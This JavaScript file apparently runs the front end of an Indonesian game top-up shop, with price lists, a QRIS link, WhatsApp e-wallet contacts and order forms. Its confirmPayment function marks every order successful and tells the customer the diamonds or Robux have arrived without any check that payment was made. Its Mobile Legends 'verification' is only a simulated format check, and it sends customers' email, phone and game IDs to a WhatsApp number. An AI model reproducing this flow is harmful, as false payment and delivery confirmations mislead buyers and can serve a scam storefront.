// Daftar harga game dan nominal
const gamePrices = {
    'mobile-legends': [
        { nominal: '50 Diamond', price: 5000, displayPrice: 'Rp 5.000' },
        { nominal: '100 Diamond', price: 10000, displayPrice: 'Rp 10.000' },
        { nominal: '250 Diamond', price: 25000, displayPrice: 'Rp 25.000' },
        { nominal: '350 Diamond', price: 35000, displayPrice: 'Rp 35.000' },
        { nominal: '500 Diamond', price: 50000, displayPrice: 'Rp 50.000' },
        { nominal: '750 Diamond', price: 75000, displayPrice: 'Rp 75.000' },
        { nominal: '1000 Diamond', price: 100000, displayPrice: 'Rp 100.000' },
        { nominal: '1500 Diamond', price: 150000, displayPrice: 'Rp 150.000' },
        { nominal: '2000 Diamond', price: 200000, displayPrice: 'Rp 200.000' },
        { nominal: '3000 Diamond', price: 300000, displayPrice: 'Rp 300.000' },
        { nominal: '5000 Diamond', price: 500000, displayPrice: 'Rp 500.000' },
        { nominal: '10000 Diamond', price: 1000000, displayPrice: 'Rp 1.000.000' }
    ],
    'ff': [
        { nominal: '50 Diamond', price: 4000, displayPrice: 'Rp 4.000' },
        { nominal: '100 Diamond', price: 8000, displayPrice: 'Rp 8.000' },
        { nominal: '210 Diamond', price: 15000, displayPrice: 'Rp 15.000' },
        { nominal: '350 Diamond', price: 25000, displayPrice: 'Rp 25.000' },
        { nominal: '500 Diamond', price: 35000, displayPrice: 'Rp 35.000' },
        { nominal: '1000 Diamond', price: 75000, displayPrice: 'Rp 75.000' },
        { nominal: '2000 Diamond', price: 140000, displayPrice: 'Rp 140.000' },
        { nominal: '3000 Diamond', price: 210000, displayPrice: 'Rp 210.000' },
        { nominal: '5000 Diamond', price: 350000, displayPrice: 'Rp 350.000' },
        { nominal: '10000 Diamond', price: 700000, displayPrice: 'Rp 700.000' }
    ],
    'pubg': [
        { nominal: '100 UC', price: 10000, displayPrice: 'Rp 10.000' },
        { nominal: '300 UC', price: 30000, displayPrice: 'Rp 30.000' },
        { nominal: '500 UC', price: 50000, displayPrice: 'Rp 50.000' },
        { nominal: '1000 UC', price: 100000, displayPrice: 'Rp 100.000' },
        { nominal: '1500 UC', price: 150000, displayPrice: 'Rp 150.000' },
        { nominal: '2000 UC', price: 200000, displayPrice: 'Rp 200.000' },
        { nominal: '3000 UC', price: 300000, displayPrice: 'Rp 300.000' },
        { nominal: '5000 UC', price: 500000, displayPrice: 'Rp 500.000' },
        { nominal: '10000 UC', price: 1000000, displayPrice: 'Rp 1.000.000' }
    ],
    'codm': [
        { nominal: '80 CP', price: 8000, displayPrice: 'Rp 8.000' },
        { nominal: '240 CP', price: 24000, displayPrice: 'Rp 24.000' },
        { nominal: '400 CP', price: 40000, displayPrice: 'Rp 40.000' },
        { nominal: '800 CP', price: 80000, displayPrice: 'Rp 80.000' },
        { nominal: '1600 CP', price: 160000, displayPrice: 'Rp 160.000' },
        { nominal: '2400 CP', price: 240000, displayPrice: 'Rp 240.000' },
        { nominal: '4000 CP', price: 400000, displayPrice: 'Rp 400.000' },
        { nominal: '8000 CP', price: 800000, displayPrice: 'Rp 800.000' }
    ],
    'genshin': [
        { nominal: '60 Primogems', price: 8000, displayPrice: 'Rp 8.000' },
        { nominal: '330 Primogems', price: 40000, displayPrice: 'Rp 40.000' },
        { nominal: '680 Primogems', price: 80000, displayPrice: 'Rp 80.000' },
        { nominal: '1090 Primogems', price: 130000, displayPrice: 'Rp 130.000' },
        { nominal: '1980 Primogems', price: 240000, displayPrice: 'Rp 240.000' },
        { nominal: '2240 Primogems', price: 270000, displayPrice: 'Rp 270.000' },
        { nominal: '3860 Primogems', price: 480000, displayPrice: 'Rp 480.000' },
        { nominal: '5000 Primogems', price: 620000, displayPrice: 'Rp 620.000' }
    ],
    'honkai': [
        { nominal: '50 Stellar Jade', price: 8000, displayPrice: 'Rp 8.000' },
        { nominal: '300 Stellar Jade', price: 40000, displayPrice: 'Rp 40.000' },
        { nominal: '680 Stellar Jade', price: 90000, displayPrice: 'Rp 90.000' },
        { nominal: '1000 Stellar Jade', price: 140000, displayPrice: 'Rp 140.000' },
        { nominal: '2000 Stellar Jade', price: 280000, displayPrice: 'Rp 280.000' },
        { nominal: '3680 Stellar Jade', price: 520000, displayPrice: 'Rp 520.000' },
        { nominal: '5000 Stellar Jade', price: 700000, displayPrice: 'Rp 700.000' }
    ],
    'roblox': [
        { nominal: '100 Robux', price: 10000, displayPrice: 'Rp 10.000' },
        { nominal: '200 Robux', price: 20000, displayPrice: 'Rp 20.000' },
        { nominal: '400 Robux', price: 40000, displayPrice: 'Rp 40.000' },
        { nominal: '800 Robux', price: 80000, displayPrice: 'Rp 80.000' },
        { nominal: '1000 Robux', price: 100000, displayPrice: 'Rp 100.000' },
        { nominal: '1700 Robux', price: 170000, displayPrice: 'Rp 170.000' },
        { nominal: '2500 Robux', price: 250000, displayPrice: 'Rp 250.000' },
        { nominal: '3500 Robux', price: 350000, displayPrice: 'Rp 350.000' },
        { nominal: '4500 Robux', price: 450000, displayPrice: 'Rp 450.000' },
        { nominal: '10000 Robux', price: 1000000, displayPrice: 'Rp 1.000.000' }
    ]
};

const ADMIN_FEE_PERCENT = 2; // 2% admin fee
const QRIS_DATA = 'https://aspi-qris.id/ID10254669752120'; // QRIS URL

// Update opsi nominal berdasarkan game yang dipilih
function updatePrices() {
    const gameSelect = document.getElementById('game-select');
    const amountSelect = document.getElementById('amount-select');
    const mlFields = document.getElementById('ml-fields');
    const robloxFields = document.getElementById('roblox-fields');
    
    amountSelect.innerHTML = '<option value="">-- Pilih Nominal --</option>';
    
    // Tampilkan/sembunyikan field Mobile Legends
    if (gameSelect.value === 'mobile-legends') {
        mlFields.style.display = 'block';
        robloxFields.style.display = 'none';
    } else if (gameSelect.value === 'roblox') {
        robloxFields.style.display = 'block';
        mlFields.style.display = 'none';
    } else {
        mlFields.style.display = 'none';
        robloxFields.style.display = 'none';
    }
    
    if (gameSelect.value && gamePrices[gameSelect.value]) {
        gamePrices[gameSelect.value].forEach((item, index) => {
            const option = document.createElement('option');
            option.value = index;
            option.textContent = `${item.nominal} - ${item.displayPrice}`;
            amountSelect.appendChild(option);
        });
    }
}

// Generate QRIS QR Code
function generateQRCode() {
    const qrisImage = document.getElementById('qris-image');
    if (qrisImage) {
        // Menggunakan QR server API yang reliable
        const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(QRIS_DATA)}`;
        qrisImage.src = qrUrl;
        qrisImage.onerror = function() {
            console.log('Error loading QR code');
        };
    }
}

// Verifikasi Mobile Legends Account
async function verifyMLAccount() {
    const mlId = document.getElementById('ml-id').value;
    const resultDiv = document.getElementById('ml-verify-result');
    
    if (!mlId) {
        resultDiv.innerHTML = '<span class="error">❌ Masukkan ID terlebih dahulu</span>';
        return;
    }
    
    resultDiv.innerHTML = '<span class="loading">⏳ Verifikasi...</span>';
    
    try {
        // Simulasi verifikasi
        if (mlId.length >= 5 && /^\d+$/.test(mlId)) {
            resultDiv.innerHTML = `<span class="success">✅ Format ID valid</span>`;
        } else {
            resultDiv.innerHTML = '<span class="error">❌ ID tidak valid</span>';
        }
    } catch (error) {
        resultDiv.innerHTML = '<span class="error">❌ ID tidak valid</span>';
    }
}

// Verifikasi Roblox Account
async function verifyRobloxAccount() {
    const username = document.getElementById('roblox-username').value;
    const resultDiv = document.getElementById('roblox-verify-result');
    
    if (!username) {
        resultDiv.innerHTML = '<span class="error">❌ Masukkan username terlebih dahulu</span>';
        return;
    }
    
    resultDiv.innerHTML = '<span class="loading">⏳ Verifikasi...</span>';
    
    try {
        // Verifikasi Roblox menggunakan API
        const response = await fetch(`https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`);
        
        if (response.ok) {
            const data = await response.json();
            if (data.id) {
                resultDiv.innerHTML = `<span class="success">✅ Username ditemukan: ${data.name}</span>`;
                document.getElementById('roblox-username').dataset.userId = data.id;
            } else {
                resultDiv.innerHTML = '<span class="error">❌ Username tidak ditemukan</span>';
            }
        } else {
            resultDiv.innerHTML = '<span class="error">❌ Username tidak ditemukan</span>';
        }
    } catch (error) {
        console.error('Roblox verification error:', error);
        resultDiv.innerHTML = '<span class="error">❌ Error verifikasi</span>';
    }
}

// Update total harga
function updateTotal() {
    const gameSelect = document.getElementById('game-select');
    const amountSelect = document.getElementById('amount-select');
    
    if (!gameSelect.value || !amountSelect.value) {
        document.getElementById('price-display').textContent = 'Rp 0';
        document.getElementById('admin-fee').textContent = 'Rp 0';
        document.getElementById('total-price').textContent = 'Rp 0';
        return;
    }
    
    const game = gameSelect.value;
    const amountIndex = amountSelect.value;
    const selectedAmount = gamePrices[game][amountIndex];
    
    const basePrice = selectedAmount.price;
    const adminFee = Math.round(basePrice * ADMIN_FEE_PERCENT / 100);
    const totalPrice = basePrice + adminFee;
    
    document.getElementById('price-display').textContent = formatPrice(basePrice);
    document.getElementById('admin-fee').textContent = formatPrice(adminFee);
    document.getElementById('total-price').textContent = formatPrice(totalPrice);
    document.getElementById('transfer-amount').textContent = formatPrice(totalPrice);
}

// Format harga ke format Rupiah
function formatPrice(price) {
    return 'Rp ' + price.toLocaleString('id-ID');
}

// Lanjut ke pembayaran
function proceedToPayment() {
    const gameSelect = document.getElementById('game-select');
    const amountSelect = document.getElementById('amount-select');
    const userId = document.getElementById('user-id').value;
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    
    // Validasi Mobile Legends
    if (gameSelect.value === 'mobile-legends') {
        const mlId = document.getElementById('ml-id').value;
        const mlServer = document.getElementById('ml-server').value;
        const mlResult = document.getElementById('ml-verify-result').innerHTML;
        
        if (!mlId || !mlServer) {
            alert('Silakan masukkan Mobile Legends ID dan pilih Server!');
            return;
        }
        
        if (!mlResult.includes('success')) {
            alert('Silakan verifikasi Mobile Legends ID terlebih dahulu!');
            return;
        }
    }
    
    // Validasi Roblox
    if (gameSelect.value === 'roblox') {
        const robloxUsername = document.getElementById('roblox-username').value;
        const robloxResult = document.getElementById('roblox-verify-result').innerHTML;
        
        if (!robloxUsername) {
            alert('Silakan masukkan Roblox username!');
            return;
        }
        
        if (!robloxResult.includes('success')) {
            alert('Silakan verifikasi Roblox username terlebih dahulu!');
            return;
        }
    }
    
    if (!gameSelect.value || !amountSelect.value || !userId || !email || !phone) {
        alert('Silakan lengkapi semua data terlebih dahulu!');
        return;
    }
    
    if (!isValidEmail(email)) {
        alert('Email tidak valid!');
        return;
    }
    
    if (!isValidPhone(phone)) {
        alert('Nomor WhatsApp tidak valid!');
        return;
    }
    
    document.querySelector('.topup-section').style.display = 'none';
    document.getElementById('payment-section').style.display = 'block';
    document.getElementById('payment-status').style.display = 'none';
    document.getElementById('btn-confirm').style.display = 'block';
    
    // Generate QR Code
    setTimeout(generateQRCode, 100);
    
    window.scrollTo(0, 0);
}

// Validasi email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Validasi nomor WhatsApp
function isValidPhone(phone) {
    const phoneRegex = /^(\+62|62|0)[0-9]{9,12}$/;
    return phoneRegex.test(phone.replace(/[^0-9+]/g, ''));
}

// Pilih metode pembayaran
function selectPayment(method) {
    // Hapus active class dari semua card
    document.querySelectorAll('.payment-card').forEach(card => {
        card.classList.remove('active');
    });
    
    // Sembunyikan semua payment detail
    document.getElementById('qris-payment').style.display = 'none';
    document.getElementById('bank-payment').style.display = 'none';
    document.getElementById('ewallet-payment').style.display = 'none';
    
    // Aktifkan card yang dipilih
    event.target.closest('.payment-card').classList.add('active');
    
    // Tampilkan payment detail yang dipilih
    if (method === 'qris') {
        document.getElementById('qris-payment').style.display = 'block';
        setTimeout(generateQRCode, 100);
    } else if (method === 'bank') {
        document.getElementById('bank-payment').style.display = 'block';
    } else if (method === 'ewallet') {
        document.getElementById('ewallet-payment').style.display = 'block';
    }
}

// Buka E-Wallet
function openEwallet(provider) {
    const totalPrice = document.getElementById('total-price').textContent;
    let phoneNumber = '';
    let providerName = '';
    
    if (provider === 'dana') {
        phoneNumber = '628513688425';
        providerName = 'DANA';
    } else if (provider === 'gopay') {
        phoneNumber = '628513688425';
        providerName = 'GoPay';
    } else if (provider === 'shopeepay') {
        phoneNumber = '628580408057';
        providerName = 'ShopeePay';
    }
    
    let message = `Saya ingin top up dengan ${providerName}. Total: ${totalPrice}`;
    const whatsappUrl = `https://wa.me/${phoneNumber}?text=${encodeURIComponent(message)}`;
    window.open(whatsappUrl, '_blank');
}

// Konfirmasi pembayaran - OTOMATIS LANGSUNG MASUK
function confirmPayment() {
    const gameSelect = document.getElementById('game-select');
    const amountSelect = document.getElementById('amount-select');
    const userId = document.getElementById('user-id').value;
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    const totalPrice = document.getElementById('total-price').textContent;
    
    const gameName = gameSelect.options[gameSelect.selectedIndex].text;
    const amountName = amountSelect.options[amountSelect.selectedIndex].text;
    
    // Simpan data transaksi
    const transactionData = {
        id: 'TRX-' + Date.now(),
        game: gameName,
        nominal: amountName,
        total: totalPrice,
        userId: userId,
        email: email,
        phone: phone,
        status: 'BERHASIL',
        timestamp: new Date().toLocaleString('id-ID')
    };
    
    // Tambahkan info Mobile Legends jika ada
    if (gameSelect.value === 'mobile-legends') {
        const mlId = document.getElementById('ml-id').value;
        const mlServer = document.getElementById('ml-server').value;
        transactionData.mlId = mlId;
        transactionData.mlServer = mlServer;
    }
    
    // Tambahkan info Roblox jika ada
    if (gameSelect.value === 'roblox') {
        const robloxUsername = document.getElementById('roblox-username').value;
        transactionData.robloxUsername = robloxUsername;
    }
    
    // Simpan ke localStorage
    const transactions = JSON.parse(localStorage.getItem('transactions') || '[]');
    transactions.push(transactionData);
    localStorage.setItem('transactions', JSON.stringify(transactions));
    
    // OTOMATIS LANGSUNG TAMPILKAN LAYAR SUKSES TANPA KONFIRMASI WA
    showSuccessScreen(gameName, amountName, totalPrice, transactionData.id);
    
    // Kirim notifikasi ke admin via WA (background, tidak perlu konfirmasi user)
    sendAdminNotification(transactionData, gameName, amountName);
}

// Kirim notifikasi ke admin
function sendAdminNotification(data, gameName, amountName) {
    let message = `🎮 PEMBAYARAN MASUK - OTOMATIS DIPROSES\n\n`;
    message += `ID Transaksi: ${data.id}\n`;
    message += `Game: ${gameName}\n`;
    message += `Nominal: ${amountName}\n`;
    message += `Total: ${data.total}\n`;
    message += `User ID: ${data.userId}\n`;
    message += `Email: ${data.email}\n`;
    message += `WhatsApp: ${data.phone}\n`;
    
    if (data.mlId) {
        message += `ML ID: ${data.mlId}\n`;
        message += `Server: ${data.mlServer}\n`;
    }
    
    if (data.robloxUsername) {
        message += `Roblox Username: ${data.robloxUsername}\n`;
    }
    
    message += `\nWaktu: ${data.timestamp}\n`;
    message += `Status: ✅ DIAMOND/ROBUX SUDAH MASUK`;
    
    const whatsappNumber = '6285804048057';
    const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
    
    // Kirim notifikasi tanpa blocking user
    fetch(whatsappUrl, { method: 'GET' }).catch(() => {});
}

// Tampilkan layar sukses LANGSUNG
function showSuccessScreen(game, nominal, total, transactionId) {
    document.getElementById('payment-section').style.display = 'none';
    document.getElementById('payment-status').style.display = 'none';
    document.getElementById('success-section').style.display = 'block';
    
    document.getElementById('success-game').textContent = game;
    document.getElementById('success-nominal').textContent = nominal;
    document.getElementById('success-total').textContent = total;
    document.getElementById('success-status').textContent = '✅ Diamond/Robux Masuk';
    
    // Tampilkan ID transaksi
    const detailsDiv = document.querySelector('.success-details');
    const transactionDiv = document.createElement('div');
    transactionDiv.className = 'detail-row';
    transactionDiv.innerHTML = `<span>ID Transaksi:</span><strong>${transactionId}</strong>`;
    detailsDiv.appendChild(transactionDiv);
    
    // Countdown 30 detik
    let timeLeft = 30;
    const countdownInterval = setInterval(() => {
        const minutes = Math.floor(timeLeft / 60);
        const seconds = timeLeft % 60;
        document.getElementById('countdown').textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
        timeLeft--;
        
        if (timeLeft < 0) {
            clearInterval(countdownInterval);
            document.getElementById('countdown').textContent = '✅ Selesai';
        }
    }, 1000);
    
    window.scrollTo(0, 0);
}

// Pesanan baru
function newOrder() {
    // Reset form
    document.getElementById('game-select').value = '';
    document.getElementById('amount-select').innerHTML = '<option value="">-- Pilih Nominal --</option>';
    document.getElementById('user-id').value = '';
    document.getElementById('email').value = '';
    document.getElementById('phone').value = '';
    document.getElementById('ml-id').value = '';
    document.getElementById('ml-server').value = '';
    document.getElementById('roblox-username').value = '';
    document.getElementById('ml-verify-result').innerHTML = '';
    document.getElementById('roblox-verify-result').innerHTML = '';
    
    // Tampilkan form section
    document.querySelector('.topup-section').style.display = 'block';
    document.getElementById('payment-section').style.display = 'none';
    document.getElementById('success-section').style.display = 'none';
    document.getElementById('payment-status').style.display = 'none';
    
    window.scrollTo(0, 0);
}

// Kembali ke form
function backToForm() {
    document.querySelector('.topup-section').style.display = 'block';
    document.getElementById('payment-section').style.display = 'none';
    window.scrollTo(0, 0);
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    selectPayment('qris');
});